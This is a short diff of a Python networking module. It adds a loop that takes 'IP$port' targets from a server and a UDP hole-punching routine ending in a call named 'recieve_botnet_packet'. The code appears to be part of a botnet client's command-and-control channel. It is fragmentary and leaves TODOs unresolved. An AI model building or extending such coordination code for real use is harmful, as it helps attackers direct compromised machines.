@@ -49,8 +49,26 @@ def contact_IPv6server(server: socket.socket, address: tuple, MAC="000000000000"
 
 def server_listener(server: socket.socket):
     set_keepalive(server)
+    server.settimeout(300)
     server.connect()
-    msg = server.recv(1024)
+    while True:
+        msg = TCP_recieve(server)
+        if msg == 0:
+            Succeeded = TCP_send(server, b'hello there')
+            if Succeeded is None: pass          # TODO: switch to another server or close thread
+            continue
+        dest_IP, dest_port = msg.split('$')  # TODO: check for incorrect message
+        dest_port = int(dest_port)
+        return (dest_IP, dest_port)
+
+
+def receive_from_node(address: tuple):
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as source:
+        succeeded = holepunch(source, address)
+        if succeeded is None:
+            return
+        return recieve_botnet_packet()
+        
 
 
 if __name__ == "__main__":
